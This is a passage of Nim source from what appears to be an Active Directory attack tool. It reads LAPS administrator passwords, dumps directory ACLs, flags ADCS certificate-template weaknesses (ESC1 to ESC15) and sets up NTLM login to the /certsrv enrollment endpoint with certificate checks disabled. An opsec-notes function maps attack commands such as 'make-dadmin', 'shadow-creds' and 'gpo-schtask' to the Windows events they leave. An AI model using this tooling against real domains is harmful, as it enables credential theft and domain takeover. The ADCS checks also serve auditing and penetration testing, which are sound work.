    attrs.add (name: "msDS-GroupMSAMembership", values: @[dmsaGroupMsaMembership])
    result = ldapclient.LdapWriteAction(kind: ldapclient.lwAdd, dn: dn, attrs: attrs)
  else:
    raise newException(ValueError, "--create expects user, computer, group, or dmsa")

proc parseLdifActions(path: string): seq[ldapclient.LdapWriteAction] =
  let content = readFile(path)
  var record: seq[string]
  proc parseRecord(record: seq[string]): ldapclient.LdapWriteAction =
    var dn = ""
    var changeType = "add"
    var attrs: seq[string]
    var mods: seq[ldapclient.LdapModification]
    var index = 0
    while index < record.len:
      let line = record[index]
      let p = line.find(':')
      if p < 0:
        inc index
        continue
      let key = line[0 ..< p].strip()
      let value = line[p + 1 .. ^1].strip()
      case key.toLowerAscii()
      of "dn": dn = value
      of "changetype": changeType = value.toLowerAscii()
      of "add", "replace", "delete":
        let op = if key == "add": ldapclient.lmoAdd elif key == "replace": ldapclient.lmoReplace else: ldapclient.lmoDelete
        let attr = value
        var values: seq[string]
        inc index
        while index < record.len and record[index] != "-":
          let av = splitAttrValue(record[index].replace(": ", "="))
          if av.attr.toLowerAscii() == attr.toLowerAscii(): values.add av.value
          inc index
        mods.add ldapclient.LdapModification(op: op, attr: attr, values: values)
      else:
        attrs.add key & "=" & value
      inc index
    if dn.len == 0: return
    case changeType
    of "delete":
      result = ldapclient.LdapWriteAction(kind: ldapclient.lwDelete, dn: dn)
    of "modify":
      result = ldapclient.LdapWriteAction(kind: ldapclient.lwModify, dn: dn, mods: mods)
    else:
      result = ldapclient.LdapWriteAction(kind: ldapclient.lwAdd, dn: dn, attrs: attrsFromAssignments(attrs))
  for raw in content.splitLines():
    if raw.len == 0:
      if record.len > 0:
        let action = parseRecord(record)
        if action.dn.len > 0:
          result.add action
        record.setLen(0)
    elif raw.startsWith("#"):
      discard
    elif raw.startsWith(" ") and record.len > 0:
      record[^1].add raw[1 .. ^1]
    else:
      record.add raw
  if record.len > 0:
    let action = parseRecord(record)
    if action.dn.len > 0:
      result.add action

proc ldapWriteResultJson(r: ldapclient.LdapWriteResult; protocol = "ldap"): JsonNode =
  var items = newJArray()
  for item in r.items:
    items.add %*{
      "kind": item.kind,
      "dn": item.dn,
      "success": item.success,
      "result_code": item.resultCode,
      "diagnostic": item.diagnostic,
      "message": item.message
    }
  %*{
    "protocol": protocol,
    "host": r.host,
    "port": r.port,
    "reachable": r.reachable,
    "authenticated": r.authenticated,
    "success": r.success,
    "bind_result_code": r.bindResultCode,
    "bind_diagnostic": r.bindDiagnostic,
    "default_naming_context": r.defaultNamingContext,
    "items": items,
    "message": r.message
  }

proc appendRollbackRecord(config: CliConfig; record: JsonNode) =
  if config.rollbackOut.len == 0 or record == nil:
    return
  var f = open(config.rollbackOut, fmAppend)
  try:
    f.writeLine($record)
  finally:
    f.close()

proc ldapNestedGroupsJson(r: ldapclient.LdapNestedGroupsResult): JsonNode =
  var groups = newJArray()
  for entry in r.groups:
    groups.add ldapEntryJson(entry)
  %*{
    "protocol": "ldap",
    "operation": "nested-groups",
    "host": r.host,
    "port": r.port,
    "reachable": r.reachable,
    "authenticated": r.authenticated,
    "success": r.success,
    "bind_result_code": r.bindResultCode,
    "bind_diagnostic": r.bindDiagnostic,
    "default_naming_context": r.defaultNamingContext,
    "target": r.target,
    "target_dn": r.targetDn,
    "groups": groups,
    "message": r.message
  }

proc ldapAclJson(r: ldapclient.LdapAclResult): JsonNode =
  proc aceTypeName(t: int): string =
    case t
    of 0: "ALLOW"
    of 1: "DENY"
    of 5: "ALLOW_OBJECT"
    of 6: "DENY_OBJECT"
    else: "TYPE_" & $t
  proc guidName(guid: string): string =
    case guid.toLowerAscii()
    of "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes"
    of "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes-All"
    of "89e95b76-444d-4c62-991a-0facbeda640c": "DS-Replication-Get-Changes-In-Filtered-Set"
    of "00299570-246d-11d0-a768-00aa006e0529": "Reset-Password"
    of "ab721a53-1e2f-11d0-9819-00aa0040529b": "User-Change-Password"
    of "bf9679c0-0de6-11d0-a285-00aa003049e2": "member"
    of "f3a64788-5306-11d1-a9c5-0000f80367c1": "servicePrincipalName"
    of "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79": "msDS-AllowedToActOnBehalfOfOtherIdentity"
    of "bf967a0e-0de6-11d0-a285-00aa003049e2": "displayName"
    of "bf967aba-0de6-11d0-a285-00aa003049e2": "user"
    else: ""
  var aces = newJArray()
  for ace in r.aces:
    var rights = newJArray()
    for right in ace.rights: rights.add %right
    aces.add %*{
      "type": ace.aceType,
      "type_name": aceTypeName(ace.aceType),
      "flags": ace.aceFlags,
      "mask": "0x" & ace.mask.toHex(8),
      "trustee_sid": ace.trusteeSid,
      "rights": rights,
      "object_type": ace.objectType,
      "object_name": guidName(ace.objectType),
      "inherited_object_type": ace.inheritedObjectType,
      "inherited_object_name": guidName(ace.inheritedObjectType)
    }
  %*{
    "protocol": "ldap",
    "operation": "acl",
    "host": r.host,
    "port": r.port,
    "reachable": r.reachable,
    "authenticated": r.authenticated,
    "success": r.success,
    "bind_result_code": r.bindResultCode,
    "bind_diagnostic": r.bindDiagnostic,
    "default_naming_context": r.defaultNamingContext,
    "target": r.target,
    "target_dn": r.targetDn,
    "owner_sid": r.ownerSid,
    "group_sid": r.groupSid,
    "aces": aces,
    "message": r.message
  }

proc ldapFiletimeToIso(value: string): string =
  if value.len == 0: return ""
  try:
    let ft = parseUInt(value)
    if ft == 0: return ""
    let unixSecs = int64((ft div 10_000_000'u64) - 11_644_473_600'u64)
    utc(fromUnix(unixSecs)).format("yyyy-MM-dd HH:mm:ss") & "Z"
  except CatchableError:
    ""

proc ldapLapsJson(r: ldapclient.LdapLapsResult): JsonNode =
  %*{
    "protocol": "ldap",
    "operation": "get-laps",
    "host": r.host,
    "port": r.port,
    "reachable": r.reachable,
    "authenticated": r.authenticated,
    "success": r.success,
    "bind_result_code": r.bindResultCode,
    "bind_diagnostic": r.bindDiagnostic,
    "default_naming_context": r.defaultNamingContext,
    "computer": r.computer,
    "computer_dn": r.computerDn,
    "sam_account_name": r.samAccountName,
    "dns_host_name": r.dnsHostName,
    "ms-Mcs-AdmPwd": r.legacyPassword,
    "ms-Mcs-AdmPwdExpirationTime": r.legacyExpiration,
    "ms-Mcs-AdmPwdExpirationTime_iso": ldapFiletimeToIso(r.legacyExpiration),
    "msLAPS-Password": r.windowsPassword,
    "msLAPS-EncryptedPassword": r.windowsEncryptedPassword,
    "msLAPS-EncryptedDSRMPassword": r.windowsEncryptedDsrmPassword,
    "msLAPS-PasswordExpirationTime": r.windowsExpiration,
    "msLAPS-PasswordExpirationTime_iso": ldapFiletimeToIso(r.windowsExpiration),
    "message": r.message
  }

proc ldapLapsSchemaJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let filter = "(|(lDAPDisplayName=ms-Mcs-AdmPwd)(lDAPDisplayName=ms-Mcs-AdmPwdExpirationTime)(lDAPDisplayName=msLAPS-Password)(lDAPDisplayName=msLAPS-EncryptedPassword)(lDAPDisplayName=msLAPS-EncryptedDSRMPassword)(lDAPDisplayName=msLAPS-PasswordExpirationTime))"
  let probe = await ldapclient.probeLdap(host, config.port, max(config.timeoutMs, 5000),
    config.username, config.password, config.domain, config.ntlmHash,
    ldapclient.LdapQueryOptions(rootDse: true, schema: true, customFilter: filter,
      customAttrs: @["lDAPDisplayName", "cn", "attributeID", "searchFlags"]))
  var attrs = newJArray()
  var names: seq[string]
  for entry in probe.schema:
    attrs.add ldapEntryJson(entry)
    if entry.attrs.hasKey("lDAPDisplayName") and entry.attrs["lDAPDisplayName"].len > 0:
      names.add entry.attrs["lDAPDisplayName"][0]
  return %*{"protocol": "ldap", "operation": "laps-schema", "host": probe.host,
    "port": probe.port, "reachable": probe.reachable,
    "authenticated": probe.authenticated,
    "default_naming_context": probe.defaultNamingContext,
    "schema_naming_context": probe.schemaNamingContext,
    "legacy_laps": ("ms-Mcs-AdmPwd" in names),
    "windows_laps": ("msLAPS-Password" in names or "msLAPS-EncryptedPassword" in names),
    "attributes": attrs,
    "success": attrs.len > 0,
    "message": if attrs.len > 0: "LAPS schema attributes found" else: "LAPS schema attributes not found"}

proc opsecNotesJson(host: string): JsonNode =
  let notes = %*[
    {
      "area": "ldap-writes",
      "events": ["Directory Service 5136", "Security 4662 when DS access auditing is enabled"],
      "applies_to": ["create", "modify", "delete", "cert-map", "shadow-creds", "gpo-set"],
      "notes": "Object attribute changes can record modified attribute names, target DNs, and caller SID."
    },
    {
      "area": "group-membership",
      "events": ["Security 4728", "Security 4732", "Security 4756"],
      "applies_to": ["add-member", "remove-member", "make-dadmin"],
      "notes": "Domain, local, and universal group membership changes can identify member, group, and caller."
    },
    {
      "area": "acl-owner-changes",
      "events": ["Security 4670", "Directory Service 5136", "Security 4662 when enabled"],
      "applies_to": ["acl-add", "acl-remove", "set-owner", "gpo-delegate"],
      "notes": "DACL/owner changes can surface as permission-change events and nTSecurityDescriptor updates."
    },
    {
      "area": "gpo-sysvol",
      "events": ["Security 5145 on SYSVOL file access when enabled", "Directory Service 5136 for version/gPLink changes"],
      "applies_to": ["gpo-create", "gpo-link", "gpo-put", "gpo-delete", "gpo-startup", "gpo-schtask"],
      "notes": "GPO file writes touch SYSVOL over SMB and usually bump GPT.INI plus the GPC versionNumber."
    },
    {
      "area": "adcs",
      "events": ["Certification Services 4886", "Certification Services 4887", "IIS logs for /certsrv when web enrollment is used"],
      "applies_to": ["adcs-request", "adcs-auth", "adcs-template"],
      "notes": "Certificate requests can leave request IDs, requester identity, template, disposition, and CA transport artifacts."
    },
    {
      "area": "kerberos",
      "events": ["Security 4768", "Security 4769", "Security 4771"],
      "applies_to": ["pkinit", "getst", "s4u", "roasting"],
      "notes": "TGT/TGS activity can show client, service, encryption type, failure code, and certificate preauth use."
    }
  ]
  %*{"protocol": "ldap", "operation": "opsec-notes", "host": host,
    "success": true, "notes": notes,
    "message": "common event IDs depend on audit policy and collection configuration"}

proc adcsEnrollmentRights(sd: string): tuple[canEnroll: bool; principals: seq[string]] =
  let parsed = ldapclient.parseSecurityDescriptor(sd)
  const enrollGuid = "0e10c968-78fb-11d2-90d4-00c04f79dc55"
  for ace in parsed.aces:
    if ace.aceType notin [0, 5]: continue
    let sid = ace.trusteeSid
    let lowPriv = sid in ["S-1-5-11", "S-1-1-0", "S-1-5-7"] or
                  sid.endsWith("-513") or sid.endsWith("-515")
    if not lowPriv: continue
    let genericAll = (ace.mask and 0x10000000'u32) != 0
    let controlAccess = (ace.mask and 0x00000100'u32) != 0
    let objectOk = ace.objectType.len == 0 or
                   ace.objectType.toLowerAscii() == enrollGuid
    if genericAll or (controlAccess and objectOk):
      result.canEnroll = true
      result.principals.add sid

proc adcsWriteRights(sd: string): seq[string] =
  let parsed = ldapclient.parseSecurityDescriptor(sd)
  for ace in parsed.aces:
    if ace.aceType notin [0, 5]: continue
    let sid = ace.trusteeSid
    let lowPriv = sid in ["S-1-5-11", "S-1-1-0", "S-1-5-7"] or
                  sid.endsWith("-513") or sid.endsWith("-515")
    if not lowPriv: continue
    let writePropertyUnrestricted =
      (ace.mask and 0x00000020'u32) != 0 and
      (ace.aceType != 5 or ace.objectType.len == 0)
    let dangerousMask =
      (ace.mask and 0x10000000'u32) != 0 or
      (ace.mask and 0x40000000'u32) != 0 or
      (ace.mask and 0x00040000'u32) != 0 or
      (ace.mask and 0x00080000'u32) != 0 or
      writePropertyUnrestricted
    if dangerousMask:
      result.add sid

proc adcsVulnFlags(entry: ldapclient.LdapEntry): seq[string] =
  let attrs = entry.attrs
  proc getInt(k: string): int =
    if not attrs.hasKey(k) or attrs[k].len == 0: return 0
    try: parseInt(attrs[k][0]) except CatchableError: 0
  let nameFlag = getInt("msPKI-Certificate-Name-Flag")
  let enrollFlag = getInt("msPKI-Enrollment-Flag")
  let raSignature = getInt("msPKI-RA-Signature")
  let ekus = if attrs.hasKey("pKIExtendedKeyUsage"): attrs["pKIExtendedKeyUsage"] else: @[]
  let enrolleeSuppliesSubject = (nameFlag and 0x1) != 0
  let managerApproval = (enrollFlag and 0x2) != 0
  let hasClientAuth = ekus.anyIt(it in ["1.3.6.1.5.5.7.3.2",
    "1.3.6.1.4.1.311.20.2.2", "1.3.6.1.5.2.3.5", "2.5.29.37.0"])
  let hasAnyPurpose = "2.5.29.37.0" in ekus
  let hasEnrollAgent = "1.3.6.1.4.1.311.20.2.1" in ekus
  let noEku = ekus.len == 0
  var canEnroll = false
  var writeRights: seq[string] = @[]
  if attrs.hasKey("nTSecurityDescriptor") and attrs["nTSecurityDescriptor"].len > 0:
    let sd = attrs["nTSecurityDescriptor"][0]
    canEnroll = adcsEnrollmentRights(sd).canEnroll
    writeRights = adcsWriteRights(sd)
  let schemaVersion = getInt("msPKI-Template-Schema-Version")
  let certPolicies = if attrs.hasKey("msPKI-Certificate-Policy"): attrs["msPKI-Certificate-Policy"] else: @[]
  let raAppPolicies = if attrs.hasKey("msPKI-RA-Application-Policies"): attrs["msPKI-RA-Application-Policies"] else: @[]
  let hasClientAuthAppPolicy = raAppPolicies.anyIt(it in ["1.3.6.1.5.5.7.3.2",
    "1.3.6.1.4.1.311.20.2.2", "1.3.6.1.5.2.3.5", "2.5.29.37.0"])
  if enrolleeSuppliesSubject and not managerApproval and raSignature == 0 and
     (hasClientAuth or noEku) and canEnroll:
    result.add "ESC1"
  if (hasAnyPurpose or noEku) and not managerApproval and canEnroll and
     "ESC1" notin result:
    result.add "ESC2"
  if hasEnrollAgent and canEnroll:
    result.add "ESC3"
  if writeRights.len > 0:
    result.add "ESC4"
  if certPolicies.len > 0 and canEnroll and not managerApproval:
    result.add "ESC13"
  if schemaVersion == 1 and canEnroll and not managerApproval and
     (hasClientAuthAppPolicy or raAppPolicies.len == 0) and (hasClientAuth or noEku):
    result.add "ESC15"

proc adcsTemplateAnalysis(entry: ldapclient.LdapEntry): JsonNode =
  let attrs = entry.attrs
  proc getInt(k: string): int =
    if not attrs.hasKey(k) or attrs[k].len == 0: return 0
    try: parseInt(attrs[k][0]) except CatchableError: 0
  proc strArray(items: seq[string]): JsonNode =
    result = newJArray()
    for item in items:
      result.add %item

  let nameFlag = getInt("msPKI-Certificate-Name-Flag")
  let enrollFlag = getInt("msPKI-Enrollment-Flag")
  let raSignature = getInt("msPKI-RA-Signature")
  let schemaVersion = getInt("msPKI-Template-Schema-Version")
  let ekus = if attrs.hasKey("pKIExtendedKeyUsage"): attrs["pKIExtendedKeyUsage"] else: @[]
  let enrolleeSuppliesSubject = (nameFlag and 0x1) != 0
  let enrolleeSuppliesSan = (nameFlag and 0x00010000) != 0
  let managerApproval = (enrollFlag and 0x2) != 0
  let noSecurityExtension = (enrollFlag and 0x00080000) != 0
  let hasClientAuth = ekus.anyIt(it in ["1.3.6.1.5.5.7.3.2",
    "1.3.6.1.4.1.311.20.2.2", "1.3.6.1.5.2.3.5", "2.5.29.37.0"])
  let hasAnyPurpose = "2.5.29.37.0" in ekus
  let hasEnrollAgent = "1.3.6.1.4.1.311.20.2.1" in ekus
  let noEku = ekus.len == 0
  var enrollment = (canEnroll: false, principals: newSeq[string]())
  var writeRights: seq[string] = @[]
  if attrs.hasKey("nTSecurityDescriptor") and attrs["nTSecurityDescriptor"].len > 0:
    let sd = attrs["nTSecurityDescriptor"][0]
    enrollment = adcsEnrollmentRights(sd)
    writeRights = adcsWriteRights(sd)

  var vulns = newJArray()
  proc addFinding(id, reason: string) =
    vulns.add %*{"id": id, "reason": reason}

  if enrolleeSuppliesSubject and not managerApproval and raSignature == 0 and
      (hasClientAuth or noEku) and enrollment.canEnroll:
    addFinding("ESC1", "low-privileged enrollment, enrollee-supplied subject, client-auth capable EKU, no manager approval, no authorized signature")
  if (hasAnyPurpose or noEku) and not managerApproval and enrollment.canEnroll and
      vulns.getElems().allIt(it{"id"}.getStr() != "ESC1"):
    addFinding("ESC2", "low-privileged enrollment, any-purpose or no EKU, no manager approval")
  if hasEnrollAgent and enrollment.canEnroll:
    addFinding("ESC3", "low-privileged enrollment on enrollment-agent template")
  if writeRights.len > 0:
    addFinding("ESC4", "low-privileged principal has template write/owner/control rights")
  if noSecurityExtension and enrollment.canEnroll and (hasClientAuth or noEku):
    addFinding("ESC9", "template omits the strong certificate security extension and is client-auth capable")

  let certPolicies = if attrs.hasKey("msPKI-Certificate-Policy"): attrs["msPKI-Certificate-Policy"] else: @[]
  if certPolicies.len > 0 and enrollment.canEnroll and not managerApproval:
    addFinding("ESC13", "template has msPKI-Certificate-Policy OID(s) - if linked to an AD group via OID object, enrollment grants group membership: " & certPolicies.join(", "))

  let raAppPolicies = if attrs.hasKey("msPKI-RA-Application-Policies"): attrs["msPKI-RA-Application-Policies"] else: @[]
  let hasClientAuthAppPolicy = raAppPolicies.anyIt(it in ["1.3.6.1.5.5.7.3.2",
    "1.3.6.1.4.1.311.20.2.2", "1.3.6.1.5.2.3.5", "2.5.29.37.0"])
  if schemaVersion == 1 and enrollment.canEnroll and not managerApproval and
     (hasClientAuthAppPolicy or raAppPolicies.len == 0) and (hasClientAuth or noEku):
    addFinding("ESC15", "schema v1 template - Application Policies extension in CSR can override EKU enforcement")

  result = %*{
    "schema_version": schemaVersion,
    "name_flags": nameFlag,
    "enrollment_flags": enrollFlag,
    "ra_signature": raSignature,
    "enrollee_supplies_subject": enrolleeSuppliesSubject,
    "enrollee_supplies_san": enrolleeSuppliesSan,
    "manager_approval": managerApproval,
    "no_security_extension": noSecurityExtension,
    "client_auth_capable": hasClientAuth,
    "any_purpose": hasAnyPurpose,
    "enrollment_agent": hasEnrollAgent,
    "no_eku": noEku,
    "low_priv_enroll": enrollment.canEnroll,
    "enroll_principals": strArray(enrollment.principals),
    "write_principals": strArray(writeRights),
    "cert_policies": strArray(certPolicies),
    "findings": vulns
  }

proc adcsCaAnalysis(entry: ldapclient.LdapEntry): JsonNode =
  let attrs = entry.attrs
  proc getInt(k: string): int =
    if not attrs.hasKey(k) or attrs[k].len == 0: return 0
    try: parseInt(attrs[k][0]) except CatchableError: 0

  let editFlags = getInt("editFlags")
  let esc6 = (editFlags and 0x00040000) != 0

  var esc7Principals: seq[string] = @[]
  if attrs.hasKey("nTSecurityDescriptor") and attrs["nTSecurityDescriptor"].len > 0:
    let sd = attrs["nTSecurityDescriptor"][0]
    let parsed = ldapclient.parseSecurityDescriptor(sd)
    for ace in parsed.aces:
      if ace.aceType notin [0, 5]: continue
      let sid = ace.trusteeSid
      let lowPriv = sid in ["S-1-5-11", "S-1-1-0", "S-1-5-7"] or
                    sid.endsWith("-513") or sid.endsWith("-515")
      if not lowPriv: continue
      let manageCA = (ace.mask and 0x00000001'u32) != 0
      let manageCerts = (ace.mask and 0x00000002'u32) != 0
      let genericAll = (ace.mask and 0x10000000'u32) != 0
      if manageCA or manageCerts or genericAll:
        esc7Principals.add sid

  var vulns = newJArray()
  proc addFinding(id, reason: string) =
    vulns.add %*{"id": id, "reason": reason}

  if esc6:
    addFinding("ESC6", "EDITF_ATTRIBUTESUBJECTALTNAME2 flag set - any template can be used to request a cert with attacker-controlled SAN")
  if esc7Principals.len > 0:
    addFinding("ESC7", "low-privileged principal has ManageCA or ManageCertificates right: " & esc7Principals.join(", "))
  addFinding("ESC8", "CA may expose HTTP enrollment at /certsrv/ - verify NTLM relay opportunity manually (informational)")

  var esc7arr = newJArray()
  for p in esc7Principals: esc7arr.add %p
  result = %*{
    "edit_flags": editFlags,
    "esc6": esc6,
    "esc7_principals": esc7arr,
    "findings": vulns
  }

proc ldapAdcsJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
  let filter = "(|(objectClass=pKIEnrollmentService)(objectClass=pKICertificateTemplate)(objectClass=certificationAuthority))"
  let attrs = @["objectClass", "cn", "name", "dNSHostName", "certificateTemplates",
    "displayName", "msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag",
    "msPKI-Private-Key-Flag", "msPKI-RA-Signature", "msPKI-Template-Schema-Version",
    "pKIExtendedKeyUsage", "nTSecurityDescriptor", "editFlags",
    "msPKI-Certificate-Policy", "msPKI-RA-Application-Policies"]
  let probe = await ldapclient.probeLdap(host, config.port, max(config.timeoutMs, 5000),
    config.username, config.password, config.domain, config.ntlmHash,
    ldapclient.LdapQueryOptions(rootDse: true, config: true,
      customFilter: filter, customAttrs: attrs, limit: config.queryLimit),
    kerberos = config.kerberos)
  var cas = newJArray()
  var templates = newJArray()
  var authorities = newJArray()
  for entry in probe.config:
    let cls = if entry.attrs.hasKey("objectClass"): entry.attrs["objectClass"].join(",").toLowerAscii() else: ""
    var node = ldapEntryJson(entry)
    if "pkienrollmentservice" in cls:
      node["ca_analysis"] = adcsCaAnalysis(entry)
      let caVulns = node["ca_analysis"]["findings"]
      if caVulns != nil and caVulns.kind == JArray and caVulns.len > 0:
        var va = newJArray()
        for v in caVulns: va.add %(v{"id"}.getStr())
        node["vulnerabilities"] = va
      cas.add node
    elif "pkicertificatetemplate" in cls:
      let vulns = adcsVulnFlags(entry)
      node["adcs_analysis"] = adcsTemplateAnalysis(entry)
      if vulns.len > 0:
        var va = newJArray()
        for v in vulns: va.add %v
        node["vulnerabilities"] = va
      templates.add node
    elif "certificationauthority" in cls:
      authorities.add node
    else:
      templates.add node
  return %*{"protocol": "ldap", "operation": "adcs",
    "host": probe.host, "port": probe.port, "reachable": probe.reachable,
    "authenticated": probe.authenticated,
    "configuration_naming_context": probe.configurationNamingContext,
    "cas": cas, "templates": templates, "authorities": authorities,
    "success": cas.len > 0 or templates.len > 0 or authorities.len > 0,
    "message": if cas.len > 0 or templates.len > 0: "ADCS objects returned" else: "no ADCS objects found"}

proc decodeChunkedBodySync(sock: Socket; initialRaw: string;
                           timeoutMs: int): string =
  var raw = initialRaw
  var chunkBuf = newString(4096)

  proc ensureAvailable(count: int): bool =
    while raw.len < count:
      let n = sock.recv(chunkBuf, 4096, timeoutMs)
      if n <= 0:
        return false
      raw.add chunkBuf[0 ..< n]
    true

  while true:
    while raw.find("\r\n") < 0:
      let n = sock.recv(chunkBuf, 4096, timeoutMs)
      if n <= 0:
        return
      raw.add chunkBuf[0 ..< n]
    let lineEnd = raw.find("\r\n")
    let sizeLine = raw[0 ..< lineEnd]
    raw = raw[lineEnd + 2 .. ^1]
    let semi = sizeLine.find(';')
    let sizeHex =
      if semi >= 0: sizeLine[0 ..< semi].strip()
      else: sizeLine.strip()
    var chunkLen = 0
    try:
      chunkLen = parseHexInt(sizeHex)
    except ValueError:
      return
    if chunkLen == 0:
      while raw.find("\r\n\r\n") < 0:
        let n = sock.recv(chunkBuf, 4096, timeoutMs)
        if n <= 0:
          return
        raw.add chunkBuf[0 ..< n]
      return
    if not ensureAvailable(chunkLen + 2):
      return
    result.add raw[0 ..< chunkLen]
    raw = raw[chunkLen + 2 .. ^1]

proc httpReadResponseSync(sock: Socket; timeoutMs: int;
                          closeOnEof = false): tuple[status: int, headers, body: string] =
  var raw = ""
  var headers = ""
  var chunk = newString(4096)
  while true:
    let split = raw.find("\r\n\r\n")
    if split >= 0:
      headers = raw[0 ..< split]
      raw = raw[split + 4 .. ^1]
      break
    let n = sock.recv(chunk, 4096, timeoutMs)
    if n <= 0:
      headers = raw
      raw = ""
      break
    raw.add chunk[0 ..< n]
  if headers.len > 0:
    let parts = headers.splitLines()[0].splitWhitespace()
    if parts.len >= 2:
      try: result.status = parseInt(parts[1]) except ValueError: discard
  var contentLength = -1
  var chunked = false
  for line in headers.splitLines():
    if line.toLowerAscii().startsWith("content-length:"):
      try: contentLength = parseInt(line["content-length:".len .. ^1].strip())
      except ValueError: discard
    elif line.toLowerAscii().startsWith("transfer-encoding:"):
      chunked = "chunked" in line.toLowerAscii()
  if contentLength >= 0:
    while raw.len < contentLength:
      let n = sock.recv(chunk, min(4096, contentLength - raw.len), timeoutMs)
      if n <= 0: break
      raw.add chunk[0 ..< n]
    if raw.len > contentLength:
      raw.setLen(contentLength)
  elif chunked:
    raw = decodeChunkedBodySync(sock, raw, timeoutMs)
  elif closeOnEof:
    while true:
      let n = sock.recv(chunk, 4096, timeoutMs)
      if n <= 0: break
      raw.add chunk[0 ..< n]
  result.headers = headers
  result.body = raw

proc extractHttpNtlmToken(headers: string): tuple[token, scheme: string] =
  for line in headers.splitLines():
    if not line.toLowerAscii().startsWith("www-authenticate:"): continue
    let value = line["www-authenticate:".len .. ^1].strip()
    if value.toLowerAscii().startsWith("ntlm "):
      try: return (base64.decode(value[5 .. ^1].strip()), "NTLM") except CatchableError: discard
    if value.toLowerAscii().startsWith("negotiate "):
      try: return (base64.decode(value[10 .. ^1].strip()), "Negotiate") except CatchableError: discard

proc adcsRecv(sock: AsyncSocket; n: int; timeoutMs: int): Future[string] {.async.} =
  let f = sock.recv(n)
  if not await withTimeout(f, timeoutMs): return
  result = await f

proc adcsRecvHeaders(sock: AsyncSocket; timeoutMs: int): Future[string] {.async.} =
  var raw = ""
  while true:
    let chunk = await adcsRecv(sock, 4096, timeoutMs)
    if chunk.len == 0: break
    raw.add chunk
    if raw.find("\r\n\r\n") >= 0: break
  result = raw

proc adcsRecvBody(sock: AsyncSocket; headers, initial: string; timeoutMs: int): Future[string] {.async.} =
  var raw = initial
  var contentLength = -1
  var chunked = false
  for line in headers.splitLines():
    if line.toLowerAscii().startsWith("content-length:"):
      try: contentLength = parseInt(line["content-length:".len .. ^1].strip())
      except ValueError: discard
    elif line.toLowerAscii().startsWith("transfer-encoding:"):
      chunked = "chunked" in line.toLowerAscii()
  if contentLength >= 0:
    while raw.len < contentLength:
      let chunk = await adcsRecv(sock, min(4096, contentLength - raw.len), timeoutMs)
      if chunk.len == 0: break
      raw.add chunk
    if raw.len > contentLength: raw.setLen(contentLength)
  elif chunked:
    result = ""
    while true:
      while raw.find("\r\n") < 0:
        let chunk = await adcsRecv(sock, 4096, timeoutMs)
        if chunk.len == 0: return
        raw.add chunk
      let lineEnd = raw.find("\r\n")
      let sizeLine = raw[0 ..< lineEnd].strip()
      raw = raw[lineEnd + 2 .. ^1]
      let semi = sizeLine.find(';')
      let sizeHex =
        if semi >= 0: sizeLine[0 ..< semi].strip()
        else: sizeLine
      var chunkLen = 0
      try: chunkLen = parseHexInt(sizeHex) except ValueError: return
      if chunkLen == 0:
        while raw.find("\r\n\r\n") < 0:
          let chunk = await adcsRecv(sock, 4096, timeoutMs)
          if chunk.len == 0: return
          raw.add chunk
        return
      while raw.len < chunkLen + 2:
        let chunk = await adcsRecv(sock, 4096, timeoutMs)
        if chunk.len == 0: return
        raw.add chunk
      result.add raw[0 ..< chunkLen]
      raw = raw[chunkLen + 2 .. ^1]
    return
  result = raw

proc adcsHttpSendAsync(sock: AsyncSocket; httpMethod, host, path, authHeader, body, contentType: string;
                       keepAlive: bool): Future[void] {.async.} =
  var req = httpMethod & " " & path & " HTTP/1.1\r\n"
  req.add "Host: " & host & "\r\n"
  req.add "User-Agent: nimux\r\n"
  req.add "Accept: */*\r\n"
  req.add "Connection: " & (if keepAlive: "Keep-Alive" else: "close") & "\r\n"
  if authHeader.len > 0:
    req.add "Authorization: " & authHeader & "\r\n"
  if body.len > 0:
    req.add "Content-Type: " & contentType & "\r\n"
  req.add "Content-Length: " & $body.len & "\r\n\r\n"
  req.add body
  await sock.send(req)

proc adcsParseResponse(raw: string): tuple[status: int; headers, body: string] =
  let split = raw.find("\r\n\r\n")
  if split < 0:
    result.headers = raw
    return
  result.headers = raw[0 ..< split]
  result.body = raw[split + 4 .. ^1]
  let parts = result.headers.splitLines()[0].splitWhitespace()
  if parts.len >= 2:
    try: result.status = parseInt(parts[1]) except ValueError: discard

proc adcsHttpNtlmRequest(host: string; port, timeoutMs: int;
                         username, password, ntlmHash, domain: string;
                         httpMethod, path, body, contentType: string;
                         ssl: bool = false): Future[tuple[status: int; headers, body, message: string]] {.async.} =
  var sock = newAsyncSocket(buffered = false)
  try:
    let connected = await proxy.connectTcp(sock, host, port, timeoutMs)
    if not connected:
      return (0, "", "", "connection timed out")
    when defined(ssl):
      if ssl:
        let ctx = newContext(verifyMode = CVerifyNone)
        ctx.wrapSocket(sock)
    proc u16le(v: int): string =
      result = newString(2); result[0] = char(v and 0xff); result[1] = char((v shr 8) and 0xff)
    proc u32le(v: uint32): string =
      result = newString(4); result[0] = char(int(v and 0xff)); result[1] = char(int((v shr 8) and 0xff))
      result[2] = char(int((v shr 16) and 0xff)); result[3] = char(int((v shr 24) and 0xff))
    await adcsHttpSendAsync(sock, "GET", host, "/certsrv/",
      "", "", "", keepAlive = true)
    let rawPre = await adcsRecvHeaders(sock, timeoutMs)
    let rPre = adcsParseResponse(rawPre)
    discard await adcsRecvBody(sock, rPre.headers, rPre.body, timeoutMs)
    if rPre.status == 200 and httpMethod == "GET":
      return (rPre.status, rPre.headers, "", "request completed")
    if rPre.status != 401:
      return (rPre.status, rPre.headers, "", "unexpected HTTP " & $rPre.status)
    let type1Flags = 0xE2088237'u32
    var type1 = "NTLMSSP\x00" & u32le(1'u32) & u32le(type1Flags)
    type1.add u16le(0) & u16le(0) & u32le(40'u32)
    type1.add u16le(0) & u16le(0) & u32le(40'u32)
    type1.add "\x0A\x00\x21\x4A\x00\x00\x00\x0F"
    await adcsHttpSendAsync(sock, "GET", host, "/certsrv/",
      "NTLM " & base64.encode(type1), "", "", keepAlive = true)
    let raw1 = await adcsRecvHeaders(sock, timeoutMs)
    let r1 = adcsParseResponse(raw1)
    let body1 = await adcsRecvBody(sock, r1.headers, r1.body, timeoutMs)
    if r1.status != 401:
      return (r1.status, r1.headers, body1, "unexpected HTTP " & $r1.status & " on NTLM Type1")
    let (challengeBlob, authScheme) = extractHttpNtlmToken(r1.headers)
